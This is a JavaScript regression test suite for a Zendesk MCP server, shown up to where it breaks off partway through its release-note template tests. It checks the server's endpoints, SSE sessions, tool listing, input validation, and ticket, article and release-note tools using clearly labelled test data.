#!/usr/bin/env node
/**
 * Extended Regression Test Suite for the Zendesk MCP Server.
 *
 * Covers all seven testing dimensions from MCP_TESTING_GUIDE.md:
 *   1. Protocol compliance (JSON-RPC 2.0)
 *   2. Transport layer (SSE session lifecycle)
 *   3. Tool discovery and registration
 *   4. Functional testing per tool
 *   5. Input validation and boundary testing
 *   6. Security testing
 *   7. Performance and concurrency
 *
 * Usage:
 *   node tests/regression.mjs [server-url]
 *
 * Default server-url:
 *   https://fourth-zendesk-mcp-server.bluewave-95f931ef.northeurope.azurecontainerapps.io
 *
 * NOTE: Ticket creation uses a test requester email to avoid sending
 *       notifications to real users during test runs.
 */

import https from 'node:https';
import http from 'node:http';

const BASE_URL = process.argv[2] ||
  'https://fourth-zendesk-mcp-server.bluewave-95f931ef.northeurope.azurecontainerapps.io';

const isHttps = BASE_URL.startsWith('https');
const proto = isHttps ? https : http;
const urlObj = new URL(BASE_URL);
const hostname = urlObj.hostname;
const port = isHttps ? 443 : urlObj.port || 80;

const PERMISSION_GROUP_ID = 4407361031693;
const TEST_REQUESTER_EMAIL = 'mcp-regression-test@fourth-test.invalid';

// ---------------------------------------------------------------------------
// Test infrastructure
// ---------------------------------------------------------------------------

let passed = 0;
let failed = 0;
let skipped = 0;
const failures = [];
const timings = [];

function assert(condition, message) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
}

function assertType(value, type, path) {
  const actual = typeof value;
  if (actual !== type) throw new Error(`Expected ${path} to be ${type}, got ${actual}`);
}

function assertDefined(value, path) {
  if (value === undefined || value === null) throw new Error(`Expected ${path} to be defined`);
}

function assertArray(value, path) {
  if (!Array.isArray(value)) throw new Error(`Expected ${path} to be an array`);
}

function assertIncludes(text, substring, message) {
  if (!text.includes(substring)) throw new Error(message || `Expected text to include "${substring}"`);
}

function assertNotIncludes(text, substring, message) {
  if (text.includes(substring)) throw new Error(message || `Expected text NOT to include "${substring}"`);
}

function assertMatches(text, regex, message) {
  if (!regex.test(text)) throw new Error(message || `Expected text to match ${regex}`);
}

async function test(name, fn) {
  const startMs = Date.now();
  try {
    await fn();
    const elapsed = Date.now() - startMs;
    console.log(`  \x1b[32mPASS\x1b[0m  ${name} (${elapsed}ms)`);
    passed++;
    timings.push({ name, elapsed, status: 'pass' });
  } catch (err) {
    const elapsed = Date.now() - startMs;
    console.log(`  \x1b[31mFAIL\x1b[0m  ${name} (${elapsed}ms)`);
    console.log(`        ${err.message}`);
    failed++;
    failures.push({ name, error: err.message });
    timings.push({ name, elapsed, status: 'fail' });
  }
}

function skip(name, reason) {
  console.log(`  \x1b[33mSKIP\x1b[0m  ${name} — ${reason}`);
  skipped++;
  timings.push({ name, elapsed: 0, status: 'skip' });
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

function httpGet(path, timeoutMs = 30000) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error(`HTTP GET timeout (${timeoutMs}ms)`)), timeoutMs);
    proto.get(`${BASE_URL}${path}`, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => { clearTimeout(timeout); resolve({ status: res.statusCode, headers: res.headers, body }); });
    }).on('error', (err) => { clearTimeout(timeout); reject(err); });
  });
}

function httpPost(path, data) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error('HTTP POST timeout')), 15000);
    const body = typeof data === 'string' ? data : JSON.stringify(data);
    const req = proto.request({
      hostname, port, path, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let resBody = '';
      res.on('data', c => resBody += c);
      res.on('end', () => { clearTimeout(timeout); resolve({ status: res.statusCode, headers: res.headers, body: resBody }); });
    });
    req.on('error', (err) => { clearTimeout(timeout); reject(err); });
    req.write(body);
    req.end();
  });
}

// ---------------------------------------------------------------------------
// SSE / MCP transport layer
// ---------------------------------------------------------------------------

function connectSSE() {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error('SSE connect timeout (15s)')), 15000);
    const req = proto.get(`${BASE_URL}/sse`, (res) => {
      const session = {
        _res: res, _req: req, _buf: '', _pending: new Map(), _nextId: 1,
        endpoint: null, sessionId: null,
      };

      res.on('data', (chunk) => {
        session._buf += chunk.toString();
        if (!session.endpoint) {
          const m = session._buf.match(/event:\s*endpoint\ndata:\s*([^\n]+)/);
          if (m) {
            session.endpoint = m[1].trim();
            const sidMatch = session.endpoint.match(/sessionId=([^&]+)/);
            session.sessionId = sidMatch ? sidMatch[1] : null;
            clearTimeout(timeout);
            resolve(session);
          }
        }
        const parts = session._buf.split(/\nevent:\s*message\ndata:\s*/);
        for (let i = 1; i < parts.length; i++) {
          const line = parts[i].split('\n')[0];
          try {
            const data = JSON.parse(line);
            if (data.id && session._pending.has(data.id)) {
              session._pending.get(data.id)(data);
              session._pending.delete(data.id);
            }
          } catch (e) { /* partial */ }
        }
      });
      res.on('error', (err) => { clearTimeout(timeout); reject(err); });
    });
    req.on('error', (err) => { clearTimeout(timeout); reject(err); });
  });
}

function closeSSE(session) {
  try { session._res.destroy(); } catch (e) { /* ignore */ }
}

function sendJsonRpc(session, method, params = {}) {
  return new Promise((resolve, reject) => {
    const id = session._nextId++;
    const timeout = setTimeout(() => {
      session._pending.delete(id);
      reject(new Error(`${method} (id=${id}) timed out after 30s`));
    }, 30000);

    session._pending.set(id, (data) => { clearTimeout(timeout); resolve(data); });

    const body = JSON.stringify({ jsonrpc: '2.0', id, method, params });
    const postReq = proto.request({
      hostname, port, path: session.endpoint, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, () => {});
    postReq.on('error', (err) => { clearTimeout(timeout); reject(err); });
    postReq.write(body);
    postReq.end();
  });
}

function callTool(session, toolName, args = {}) {
  return sendJsonRpc(session, 'tools/call', { name: toolName, arguments: args });
}

function listTools(session) {
  return sendJsonRpc(session, 'tools/list', {});
}

function getToolResult(response) {
  if (response.error) throw new Error(`MCP error ${response.error.code}: ${response.error.message}`);
  const content = response.result?.content;
  if (!content || !content[0]) throw new Error('Empty tool result');
  return content[0];
}

function getToolText(response) { return getToolResult(response).text; }

function getToolJSON(response) { return JSON.parse(getToolText(response)); }

function isErrorResult(response) { return response.result?.isError === true; }

function hasAnyError(response) { return response.error || isErrorResult(response); }

// ---------------------------------------------------------------------------
// Shared state
// ---------------------------------------------------------------------------

const state = {
  createdTicketId: null,
  createdArticleId: null,
  releaseNoteArticleIds: [],
  sectionId: null,
  sampleTicketId: null,
  sampleArticleId: null,
};

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main() {
  console.log(`\n${'='.repeat(70)}`);
  console.log(`  Zendesk MCP Server — Extended Regression Tests`);
  console.log(`  Server:    ${BASE_URL}`);
  console.log(`  Date:      ${new Date().toISOString()}`);
  console.log(`  Requester: ${TEST_REQUESTER_EMAIL} (no emails to real users)`);
  console.log(`${'='.repeat(70)}\n`);

  let session;

  // =========================================================================
  // SECTION 1: HEALTH & HTTP ENDPOINTS
  // =========================================================================
  console.log('--- 1. Health & HTTP Endpoints ---');

  await test('GET /health returns 200 with correct JSON shape', async () => {
    const res = await httpGet('/health');
    assert(res.status === 200, `status ${res.status}`);
    const data = JSON.parse(res.body);
    assert(data.status === 'healthy', `status = ${data.status}`);
    assert(data.service === 'Zendesk MCP Server', `service = ${data.service}`);
    assertDefined(data.version, 'version');
    assert(data.transport === 'sse', `transport = ${data.transport}`);
  });

  await test('GET / (root) also returns health response', async () => {
    const res = await httpGet('/');
    assert(res.status === 200, `status ${res.status}`);
    const data = JSON.parse(res.body);
    assert(data.status === 'healthy', `status`);
  });

  await test('GET /nonexistent returns 404', async () => {
    const res = await httpGet('/nonexistent');
    assert(res.status === 404, `expected 404, got ${res.status}`);
  });

  await test('POST /messages without sessionId returns 400', async () => {
    const res = await httpPost('/messages', { jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} });
    assert(res.status === 400, `expected 400, got ${res.status}`);
    assertIncludes(res.body, 'session', 'response should mention session');
  });

  await test('POST /messages with invalid sessionId returns 400', async () => {
    const res = await httpPost('/messages?sessionId=nonexistent-uuid', { jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} });
    assert(res.status === 400, `expected 400, got ${res.status}`);
  });

  await test('Health response Content-Type is application/json', async () => {
    const res = await httpGet('/health');
    assert(res.headers['content-type'].includes('application/json'), `content-type: ${res.headers['content-type']}`);
  });

  // =========================================================================
  // SECTION 2: SSE TRANSPORT LAYER
  // =========================================================================
  console.log('\n--- 2. SSE Transport Layer ---');

  await test('SSE connection establishes and returns endpoint event', async () => {
    session = await connectSSE();
    assert(session.endpoint, 'endpoint is set');
    assert(session.endpoint.startsWith('/messages?sessionId='), `endpoint: ${session.endpoint}`);
  });

  await test('SSE session ID is a valid UUID', async () => {
    assertDefined(session.sessionId, 'sessionId');
    assertMatches(session.sessionId, /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i, `not a UUID: ${session.sessionId}`);
  });

  await test('New SSE connection after close gets different session ID', async () => {
    const firstSid = session.sessionId;
    closeSSE(session);
    await new Promise(r => setTimeout(r, 500));
    session = await connectSSE();
    assertDefined(session.sessionId, 'new sessionId');
    assert(session.sessionId !== firstSid, `same session ID: ${firstSid}`);
  });

  await test('Closed session rejects new POST messages', async () => {
    const oldEndpoint = session.endpoint;
    closeSSE(session);
    await new Promise(r => setTimeout(r, 500));
    const res = await httpPost(oldEndpoint, { jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} });
    assert(res.status === 400, `expected 400 for closed session, got ${res.status}`);
    session = await connectSSE();
  });

  // =========================================================================
  // SECTION 3: TOOL DISCOVERY & REGISTRATION
  // =========================================================================
  console.log('\n--- 3. Tool Discovery & Registration ---');

  const EXPECTED_TOOLS = [
    'list_tickets', 'get_ticket', 'create_ticket', 'update_ticket',
    'list_articles', 'get_article', 'create_article', 'update_article',
    'search', 'create_release_note',
  ];

  let toolsList;

  await test('tools/list returns exactly 10 tools', async () => {
    const resp = await listTools(session);
    toolsList = resp.result.tools;
    assertArray(toolsList, 'tools');
    assert(toolsList.length === 10, `got ${toolsList.length}, expected 10`);
  });

  await test('All expected tool names are present', async () => {
    const names = toolsList.map(t => t.name);
    for (const expected of EXPECTED_TOOLS) {
      assert(names.includes(expected), `missing: ${expected}`);
    }
  });

  await test('No duplicate tool names', async () => {
    const names = toolsList.map(t => t.name);
    const unique = new Set(names);
    assert(unique.size === names.length, `duplicates found: ${names.length} tools, ${unique.size} unique`);
  });

  await test('Each tool has description >10 chars', async () => {
    for (const tool of toolsList) {
      assertType(tool.description, 'string', `${tool.name}.description`);
      assert(tool.description.length > 10, `${tool.name}: description too short (${tool.description.length} chars)`);
    }
  });

  await test('Each tool has inputSchema with type "object"', async () => {
    for (const tool of toolsList) {
      assertDefined(tool.inputSchema, `${tool.name}.inputSchema`);
      assert(tool.inputSchema.type === 'object', `${tool.name}: schema type = ${tool.inputSchema.type}`);
    }
  });

  await test('Each tool inputSchema has properties object', async () => {
    for (const tool of toolsList) {
      assertDefined(tool.inputSchema.properties, `${tool.name}.inputSchema.properties`);
      assertType(tool.inputSchema.properties, 'object', `${tool.name}.inputSchema.properties`);
    }
  });

  await test('Read-only tools have readOnlyHint annotation', async () => {
    const readTools = ['list_tickets', 'get_ticket', 'list_articles', 'get_article', 'search'];
    for (const name of readTools) {
      const tool = toolsList.find(t => t.name === name);
      // Annotations may not be exposed in all SDK versions; check if present
      if (tool.annotations) {
        assert(tool.annotations.readOnlyHint === true, `${name}: readOnlyHint should be true`);
      }
    }
  });

  await test('No tool has destructiveHint=true (delete ops removed)', async () => {
    for (const tool of toolsList) {
      if (tool.annotations) {
        assert(tool.annotations.destructiveHint !== true, `${tool.name}: destructiveHint should not be true`);
      }
    }
  });

  await test('tools/list is idempotent (second call returns same result)', async () => {
    const resp2 = await listTools(session);
    assert(resp2.result.tools.length === toolsList.length, 'tool count changed between calls');
    const names1 = toolsList.map(t => t.name).sort().join(',');
    const names2 = resp2.result.tools.map(t => t.name).sort().join(',');
    assert(names1 === names2, 'tool names changed between calls');
  });

  // =========================================================================
  // SECTION 4: SEARCH TOOL
  // =========================================================================
  console.log('\n--- 4. Search Tool ---');

  await test('search: ticket query returns results with correct shape', async () => {
    const resp = await callTool(session, 'search', { query: 'type:ticket', per_page: 2 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertDefined(data.results, 'results');
    assertArray(data.results, 'results');
    assertDefined(data.count, 'count');
    assertType(data.count, 'number', 'count');
  });

  await test('search: keyword query returns results', async () => {
    const resp = await callTool(session, 'search', { query: 'release', per_page: 2 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertArray(data.results, 'results');
  });

  await test('search: empty result set is handled gracefully', async () => {
    const resp = await callTool(session, 'search', { query: 'subject:"zzz_no_match_xyz_99999"', per_page: 1 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertArray(data.results, 'results');
    assert(data.results.length === 0 || data.count === 0, 'expected empty results');
  });

  await test('search: per_page=1 returns at most 1 result', async () => {
    const resp = await callTool(session, 'search', { query: 'type:ticket', per_page: 1 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assert(data.results.length <= 1, `expected <=1 result, got ${data.results.length}`);
  });

  await test('search: rejects query exceeding max length (>1000 chars)', async () => {
    const resp = await callTool(session, 'search', { query: 'a'.repeat(1001) });
    assert(hasAnyError(resp), 'expected error for oversized query');
  });

  await test('search: rejects per_page > 100', async () => {
    const resp = await callTool(session, 'search', { query: 'test', per_page: 101 });
    assert(hasAnyError(resp), 'expected error for per_page > 100');
  });

  await test('search: rejects per_page = 0', async () => {
    const resp = await callTool(session, 'search', { query: 'test', per_page: 0 });
    assert(hasAnyError(resp), 'expected error for per_page = 0');
  });

  await test('search: rejects negative per_page', async () => {
    const resp = await callTool(session, 'search', { query: 'test', per_page: -1 });
    assert(hasAnyError(resp), 'expected error for negative per_page');
  });

  await test('search: Unicode characters in query do not crash', async () => {
    const resp = await callTool(session, 'search', { query: 'résumé café naïve 日本語', per_page: 1 });
    assert(!resp.error, 'JSON-RPC error on Unicode query');
  });

  await test('search: special characters in query are handled', async () => {
    const resp = await callTool(session, 'search', { query: 'test & "quoted" <html>', per_page: 1 });
    assert(!resp.error, 'JSON-RPC error on special chars');
  });

  // =========================================================================
  // SECTION 5: TICKET TOOLS
  // =========================================================================
  console.log('\n--- 5. Ticket Tools ---');

  await test('list_tickets: returns paginated result with tickets array', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 3 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertDefined(data.tickets, 'tickets');
    assertArray(data.tickets, 'tickets');
  });

  await test('list_tickets: per_page=1 returns at most 1 ticket', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 1 });
    const data = getToolJSON(resp);
    assert(data.tickets.length <= 1, `got ${data.tickets.length}`);
  });

  await test('list_tickets: ticket objects have required fields', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 1 });
    const data = getToolJSON(resp);
    if (data.tickets.length === 0) { skip('list_tickets: fields', 'no tickets'); return; }
    const t = data.tickets[0];
    state.sampleTicketId = t.id;
    assertDefined(t.id, 'id'); assertDefined(t.subject, 'subject');
    assertDefined(t.status, 'status'); assertDefined(t.created_at, 'created_at');
    assertDefined(t.updated_at, 'updated_at');
    assert('priority' in t, 'priority field exists');
  });

  await test('list_tickets: rejects per_page > 100', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 101 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('list_tickets: rejects per_page = 0', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 0 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('list_tickets: with no params returns default page', async () => {
    const resp = await callTool(session, 'list_tickets', {});
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertArray(data.tickets, 'tickets');
  });

  await test('get_ticket: retrieves ticket by ID with full data', async () => {
    if (!state.sampleTicketId) { skip('get_ticket', 'no sample'); return; }
    const resp = await callTool(session, 'get_ticket', { id: state.sampleTicketId });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertDefined(data.ticket, 'ticket');
    assert(data.ticket.id === state.sampleTicketId, 'id mismatch');
    assertDefined(data.ticket.subject, 'subject');
    assertDefined(data.ticket.description, 'description');
  });

  await test('get_ticket: non-existent ID returns error', async () => {
    const resp = await callTool(session, 'get_ticket', { id: 999999999 });
    assert(isErrorResult(resp), 'expected error');
    assertIncludes(getToolText(resp), 'Error', 'error message');
  });

  await test('get_ticket: missing id param returns validation error', async () => {
    const resp = await callTool(session, 'get_ticket', {});
    assert(hasAnyError(resp), 'expected error for missing id');
  });

  await test('create_ticket: creates ticket with test requester (no email to Boyan)', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: '[REGRESSION TEST] Automated ticket - safe to delete',
      comment: 'Created by MCP regression test suite. No notifications to real users.',
      priority: 'low',
      tags: ['regression-test', 'automated', 'mcp-test'],
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const text = getToolText(resp);
    assertIncludes(text, 'created', 'success message');
    const jsonMatch = text.match(/\{[\s\S]+\}/);
    if (jsonMatch) {
      const data = JSON.parse(jsonMatch[0]);
      state.createdTicketId = data.ticket?.id;
      assertDefined(state.createdTicketId, 'created ticket id');
    }
  });

  await test('create_ticket: created ticket is retrievable', async () => {
    if (!state.createdTicketId) { skip('create_ticket: verify', 'not created'); return; }
    const resp = await callTool(session, 'get_ticket', { id: state.createdTicketId });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertIncludes(data.ticket.subject, 'REGRESSION TEST', 'subject');
    assert(data.ticket.tags.includes('regression-test'), 'missing tag');
    assert(data.ticket.priority === 'low', `priority: ${data.ticket.priority}`);
  });

  await test('update_ticket: changes status and adds tag', async () => {
    if (!state.createdTicketId) { skip('update_ticket', 'not created'); return; }
    const resp = await callTool(session, 'update_ticket', {
      id: state.createdTicketId,
      status: 'pending',
      tags: ['regression-test', 'automated', 'mcp-test', 'updated'],
    });
    assert(!isErrorResult(resp), getToolText(resp));
    assertIncludes(getToolText(resp), 'updated', 'success message');
  });

  await test('update_ticket: verify status update applied', async () => {
    if (!state.createdTicketId) { skip('update_ticket: verify', 'not created'); return; }
    const resp = await callTool(session, 'get_ticket', { id: state.createdTicketId });
    const data = getToolJSON(resp);
    assert(data.ticket.status === 'pending', `status: ${data.ticket.status}`);
  });

  await test('update_ticket: add comment to existing ticket', async () => {
    if (!state.createdTicketId) { skip('update_ticket: comment', 'not created'); return; }
    const resp = await callTool(session, 'update_ticket', {
      id: state.createdTicketId,
      comment: 'Follow-up comment from regression test.',
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('update_ticket: change priority', async () => {
    if (!state.createdTicketId) { skip('update_ticket: priority', 'not created'); return; }
    const resp = await callTool(session, 'update_ticket', {
      id: state.createdTicketId,
      priority: 'normal',
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('update_ticket: non-existent ticket returns error', async () => {
    const resp = await callTool(session, 'update_ticket', { id: 999999999, status: 'open' });
    assert(isErrorResult(resp), 'expected error');
  });

  await test('create_ticket: missing required fields returns error', async () => {
    const resp = await callTool(session, 'create_ticket', {});
    assert(hasAnyError(resp), 'expected error for empty params');
  });

  await test('create_ticket: missing comment returns error', async () => {
    const resp = await callTool(session, 'create_ticket', { subject: 'Test' });
    assert(hasAnyError(resp), 'expected error for missing comment');
  });

  await test('create_ticket: missing subject returns error', async () => {
    const resp = await callTool(session, 'create_ticket', { comment: 'Test' });
    assert(hasAnyError(resp), 'expected error for missing subject');
  });

  await test('create_ticket: invalid priority value returns error', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: 'test', comment: 'test', priority: 'super_mega_urgent',
    });
    assert(hasAnyError(resp), 'expected error for invalid priority');
  });

  await test('create_ticket: invalid type value returns error', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: 'test', comment: 'test', type: 'invalid_type',
    });
    assert(hasAnyError(resp), 'expected error for invalid type');
  });

  // =========================================================================
  // SECTION 6: ARTICLE TOOLS
  // =========================================================================
  console.log('\n--- 6. Article Tools ---');

  await test('list_articles: returns paginated article list', async () => {
    const resp = await callTool(session, 'list_articles', { per_page: 3 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertDefined(data.articles, 'articles');
    assertArray(data.articles, 'articles');
  });

  await test('list_articles: article objects have required fields', async () => {
    const resp = await callTool(session, 'list_articles', { per_page: 1 });
    const data = getToolJSON(resp);
    if (data.articles.length === 0) { skip('list_articles: fields', 'no articles'); return; }
    const a = data.articles[0];
    state.sampleArticleId = a.id;
    state.sectionId = a.section_id;
    assertDefined(a.id, 'id'); assertDefined(a.title, 'title');
    assertDefined(a.locale, 'locale'); assertDefined(a.section_id, 'section_id');
    assertDefined(a.created_at, 'created_at');
  });

  await test('list_articles: per_page=1 limits results', async () => {
    const resp = await callTool(session, 'list_articles', { per_page: 1 });
    const data = getToolJSON(resp);
    assert(data.articles.length <= 1, `got ${data.articles.length}`);
  });

  await test('list_articles: with no params returns default page', async () => {
    const resp = await callTool(session, 'list_articles', {});
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertArray(data.articles, 'articles');
  });

  await test('list_articles: rejects per_page > 100', async () => {
    const resp = await callTool(session, 'list_articles', { per_page: 101 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('get_article: retrieves article by ID with body', async () => {
    if (!state.sampleArticleId) { skip('get_article', 'no sample'); return; }
    const resp = await callTool(session, 'get_article', { id: state.sampleArticleId });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assert(data.article.id === state.sampleArticleId, 'id mismatch');
    assertDefined(data.article.body, 'body');
    assertDefined(data.article.title, 'title');
  });

  await test('get_article: non-existent ID returns error', async () => {
    const resp = await callTool(session, 'get_article', { id: 999999999 });
    assert(isErrorResult(resp), 'expected error');
  });

  await test('get_article: missing id returns validation error', async () => {
    const resp = await callTool(session, 'get_article', {});
    assert(hasAnyError(resp), 'expected error');
  });

  await test('create_article: creates draft article', async () => {
    if (!state.sectionId) { skip('create_article', 'no section'); return; }
    const resp = await callTool(session, 'create_article', {
      title: '[REGRESSION TEST] Draft article - safe to delete',
      body: '<p>Created by regression test. <strong>Safe to delete.</strong></p>',
      section_id: state.sectionId,
      draft: true, locale: 'en-us',
      permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const text = getToolText(resp);
    assertIncludes(text, 'created', 'success message');
    const jsonMatch = text.match(/\{[\s\S]+\}/);
    if (jsonMatch) {
      const data = JSON.parse(jsonMatch[0]);
      state.createdArticleId = data.article?.id;
    }
    assertDefined(state.createdArticleId, 'article id');
  });

  await test('create_article: created article is a draft', async () => {
    if (!state.createdArticleId) { skip('create_article: draft', 'not created'); return; }
    const resp = await callTool(session, 'get_article', { id: state.createdArticleId });
    const data = getToolJSON(resp);
    assert(data.article.draft === true, 'not a draft');
    assertIncludes(data.article.title, 'REGRESSION TEST', 'title');
  });

  await test('create_article: HTML body is preserved correctly', async () => {
    if (!state.createdArticleId) { skip('create_article: html', 'not created'); return; }
    const resp = await callTool(session, 'get_article', { id: state.createdArticleId });
    const data = getToolJSON(resp);
    assertIncludes(data.article.body, '<strong>', 'HTML strong tag');
    assertIncludes(data.article.body, 'Safe to delete', 'body content');
  });

  await test('update_article: changes title via translations API', async () => {
    if (!state.createdArticleId) { skip('update_article', 'not created'); return; }
    const resp = await callTool(session, 'update_article', {
      id: state.createdArticleId,
      title: '[REGRESSION TEST] Updated article title',
      body: '<p>Updated body. <em>Update verified.</em></p>',
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const text = getToolText(resp);
    assertIncludes(text, 'updated', 'success');
    const jsonMatch = text.match(/\{[\s\S]+\}/);
    if (jsonMatch) {
      const data = JSON.parse(jsonMatch[0]);
      if (data.article) {
        assertIncludes(data.article.title, 'Updated', 'title in response');
      }
    }
  });

  await test('update_article: get confirms title change (with retry)', async () => {
    if (!state.createdArticleId) { skip('update_article: verify', 'not created'); return; }
    let verified = false;
    for (let i = 0; i < 3; i++) {
      await new Promise(r => setTimeout(r, 2000));
      const resp = await callTool(session, 'get_article', { id: state.createdArticleId });
      if (isErrorResult(resp)) continue;
      const data = getToolJSON(resp);
      if (data.article.title.includes('Updated') && data.article.body.includes('Update verified')) {
        verified = true; break;
      }
    }
    assert(verified, 'update not visible after retries');
  });

  await test('create_article: missing body returns error', async () => {
    const resp = await callTool(session, 'create_article', {
      title: 'Test', section_id: state.sectionId || 1, permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(hasAnyError(resp), 'expected error for missing body');
  });

  await test('create_article: missing title returns error', async () => {
    const resp = await callTool(session, 'create_article', {
      body: '<p>test</p>', section_id: state.sectionId || 1, permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(hasAnyError(resp), 'expected error for missing title');
  });

  await test('create_article: missing section_id returns error', async () => {
    const resp = await callTool(session, 'create_article', {
      title: 'Test', body: '<p>test</p>', permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(hasAnyError(resp), 'expected error for missing section_id');
  });

  // =========================================================================
  // SECTION 7: RELEASE NOTE TOOL — VALIDATION
  // =========================================================================
  console.log('\n--- 7. Release Note Tool — Validation ---');

  await test('create_release_note: empty markdown rejected', async () => {
    const resp = await callTool(session, 'create_release_note', { markdown_content: '', section_id: 1 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('create_release_note: plain text without sections rejected', async () => {
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: 'Plain text with no functionality headers.',
      section_id: state.sectionId || 1,
    });
    assert(isErrorResult(resp), 'expected error');
    assertIncludes(getToolText(resp), 'Functionality', 'error mentions Functionality');
  });

  await test('create_release_note: Name without Description rejected', async () => {
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: '### Functionality 1 Name\nOnly a name here',
      section_id: state.sectionId || 1,
    });
    assert(isErrorResult(resp), 'expected error');
  });

  await test('create_release_note: empty Name rejected', async () => {
    const md = '### Functionality 1 Name\n   \n### Functionality 1 Description\nSome desc';
    const resp = await callTool(session, 'create_release_note', { markdown_content: md, section_id: state.sectionId || 1 });
    assert(isErrorResult(resp), 'expected error');
  });

  await test('create_release_note: Description without Name rejected', async () => {
    const md = '### Functionality 1 Description\nOnly description, no name header';
    const resp = await callTool(session, 'create_release_note', { markdown_content: md, section_id: state.sectionId || 1 });
    assert(isErrorResult(resp), 'expected error');
  });

  await test('create_release_note: missing section_id rejected', async () => {
    const md = '### Functionality 1 Name\nFeat\n### Functionality 1 Description\nDesc';
    const resp = await callTool(session, 'create_release_note', { markdown_content: md });
    assert(hasAnyError(resp), 'expected error');
  });

  // =========================================================================
  // SECTION 8: RELEASE NOTE TOOL — FUNCTIONAL (UK/US TEMPLATES)
  // =========================================================================
  console.log('\n--- 8. Release Note Tool — Templates ---');

  let ukArticleId, usArticleId;

  await test('create_release_note: UK template with single feature', async () => {
    if (!state.sectionId) { skip('UK template', 'no section'); return; }
    const md = '### Functionality 1 Name\nUK Regression Feature\n### Functionality 1 Description\nUK regression test for template validation.';
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: md, use_us_template: false, section_id: state.sectionId,
      permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    assertIncludes(getToolText(resp), 'Release note created', 'success');
    const m = getToolText(resp).match(/\{[\s\S]+\}/);
    if (m) { ukArticleId = JSON.parse(m[0]).article?.id; state.releaseNoteArticleIds.push(ukArticleId); }
  });

  await test('UK template: title has correct format', async () => {
    if (!ukArticleId) { skip('UK title', 'not created'); return; }
    const data = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId }));
    assertIncludes(data.article.title, 'New Release | Product Name:', 'UK title prefix');
    assertIncludes(data.article.title, 'UK Regression Feature', 'feature name in title');
    assertIncludes(data.article.title, 'DD Mmm YYYY', 'date placeholder');
  });

  await test('UK template: body has What\'s New section', async () => {
    if (!ukArticleId) { skip('UK whats new', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId })).article.body;
    assertIncludes(body, "What's New?", 'header');
  });

  await test('UK template: body has wysiwyg-font-size-large class', async () => {
    if (!ukArticleId) { skip('UK font', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId })).article.body;
    assertIncludes(body, 'wysiwyg-font-size-large', 'CSS class');
  });

  await test('UK template: body has Release Note Info/Steps section', async () => {
    if (!ukArticleId) { skip('UK info', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId })).article.body;
    assertIncludes(body, 'Release Note Info/Steps', 'section header');
  });

  await test('UK template: body has Y/N checklist items', async () => {
    if (!ukArticleId) { skip('UK checklist', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId })).article.body;
    assertIncludes(body, 'Enabled by default?', 'checklist');
    assertIncludes(body, 'Instructions/Screenshots', 'instructions');
  });

  await test('UK template: body has "Use the links above" text', async () => {
    if (!ukArticleId) { skip('UK links', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: ukArticleId })).article.body;
    assertIncludes(body, 'Use the links above', 'UK-specific text');
  });

  await test('create_release_note: US template with multiple features', async () => {
